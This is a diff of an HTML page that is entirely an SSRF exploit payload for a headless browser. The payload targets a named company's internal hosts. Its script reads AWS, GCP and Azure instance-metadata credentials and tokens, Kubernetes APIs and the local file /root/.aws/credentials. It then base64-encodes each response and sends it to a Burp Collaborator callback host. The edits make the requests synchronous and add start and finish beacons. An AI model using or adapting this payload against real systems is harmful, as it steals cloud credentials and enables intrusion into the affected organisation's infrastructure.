@@ -1,51 +1,66 @@
 <!DOCTYPE html>
 <html>
-<!-- SSRF probe: exfil via JS fetch -> Burp Collaborator -->
-<img src="https://xtugidit39jm7kmw4cl0ut51fslk99.oastify.com/loaded">
 <script>
 var CB = 'https://xtugidit39jm7kmw4cl0ut51fslk99.oastify.com'\;
 
+// Synchronous exfil - blocks until request completes
 function exfil(tag, data) {
   var enc;
-  try { enc = btoa(unescape(encodeURIComponent(String(data).slice(0, 3000)))); } catch(e) { enc = btoa(String(data).slice(0, 3000)); }
-  var url = CB + '/x?t=' + encodeURIComponent(tag) + '&d=' + enc;
-  new Image().src = url;
-  try { var x = new XMLHttpRequest(); x.open('GET', url, true); x.send(); } catch(e) {}
+  try { enc = btoa(unescape(encodeURIComponent(String(data).slice(0, 3000)))); } catch(e) { enc = 'ERR'; }
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', CB + '/x?t=' + encodeURIComponent(tag) + '&d=' + enc, false); // false=sync
+    x.send();
+  } catch(e) {}
 }
 
-function probe(tag, url, opts) {
-  var t0 = Date.now();
-  fetch(url, opts || {})
-    .then(function(r) {
-      var s = r.status;
-      return r.text().then(function(body) { exfil(tag, 'HTTP ' + s + '\n' + body); });
-    })
-    .catch(function(e) { exfil(tag + ':ERR', e.message + ' [' + (Date.now()-t0) + 'ms]'); });
+// Synchronous probe - returns [status, body] or throws
+function probe(tag, url, headers) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', url, false); // synchronous
+    if (headers) { for (var h in headers) x.setRequestHeader(h, headers[h]); }
+    x.send();
+    exfil(tag, 'HTTP ' + x.status + '\n' + x.responseText);
+  } catch(e) {
+    exfil(tag + ':ERR', e.message);
+  }
 }
+
+exfil('start', 'HeadlessChrome running');
 
 // ── AWS IMDSv1 ──────────────────────────────────────────────
 probe('aws-root',     'http://169.254.169.254/latest/meta-data/');
 probe('aws-iam-list', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
 probe('aws-userdata', 'http://169.254.169.254/latest/user-data');
-probe('aws-hostn',    'http://169.254.169.254/latest/meta-data/hostname');
+probe('aws-hostname', 'http://169.254.169.254/latest/meta-data/hostname');
+probe('aws-region',   'http://169.254.169.254/latest/meta-data/placement/region');
 
 // ── AWS IMDSv2 ───────────────────────────────────────────────
-fetch('http://169.254.169.254/latest/api/token', {
-  method: 'PUT',
-  headers: {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}
-}).then(function(r) { return r.text(); }).then(function(tok) {
+try {
+  var t = new XMLHttpRequest();
+  t.open('PUT', 'http://169.254.169.254/latest/api/token', false);
+  t.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
+  t.send();
+  var tok = t.responseText;
   exfil('imdsv2-token', tok);
-  probe('imdsv2-iam-list', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', {headers:{'X-aws-ec2-metadata-token': tok}});
-}).catch(function(e) { exfil('imdsv2:ERR', e.message); });
+  probe('imdsv2-iam',  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+        {'X-aws-ec2-metadata-token': tok});
+} catch(e) { exfil('imdsv2:ERR', e.message); }
 
 // ── GCP metadata ─────────────────────────────────────────────
-probe('gcp-all',   'http://metadata.google.internal/computeMetadata/v1/?recursive=true', {headers:{'Metadata-Flavor':'Google'}});
-probe('gcp-token', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {headers:{'Metadata-Flavor':'Google'}});
-probe('gcp-169',   'http://169.254.169.254/computeMetadata/v1/?recursive=true', {headers:{'Metadata-Flavor':'Google'}});
+probe('gcp-all',   'http://metadata.google.internal/computeMetadata/v1/?recursive=true',
+      {'Metadata-Flavor': 'Google'});
+probe('gcp-token', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
+      {'Metadata-Flavor': 'Google'});
+probe('gcp-169',   'http://169.254.169.254/computeMetadata/v1/?recursive=true',
+      {'Metadata-Flavor': 'Google'});
 
 // ── Azure IMDS ───────────────────────────────────────────────
-probe('azure-instance', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {headers:{'Metadata':'true'}});
-probe('azure-identity', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', {headers:{'Metadata':'true'}});
+probe('azure-instance', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+      {'Metadata': 'true'});
+probe('azure-identity', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
+      {'Metadata': 'true'});
 
 // ── Kubernetes ───────────────────────────────────────────────
 probe('k8s-ns',      'http://kubernetes.default.svc/api/v1/namespaces/');
@@ -69,5 +84,7 @@ probe('aws-creds',    'file:///root/.aws/credentials');
   'https://internal.stravito.com/',
   'https://data.dev.stravito.com/'
 ].forEach(function(u) { probe('stravito:' + u, u); });
+
+exfil('done', 'all probes finished');
 </script>
 </html>
